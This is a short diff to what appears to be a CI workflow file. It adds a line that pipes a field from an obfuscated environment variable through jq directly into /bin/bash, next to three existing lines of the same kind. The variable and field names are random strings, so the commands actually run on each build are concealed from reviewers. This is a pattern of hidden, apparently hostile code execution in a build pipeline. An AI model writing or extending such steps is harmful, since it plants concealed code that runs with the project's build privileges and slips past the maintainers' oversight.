@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$cgz8818" | jq -r .bumaa764 | /bin/bash
           echo $nlst27889 | jq -r .r72 | /bin/bash
           echo $atbd409 | jq -r .t297 | /bin/bash
+          printf '%s' "$no64" | jq -r .r525 | /bin/bash
 
       - name: Upload artifact
         if: always()
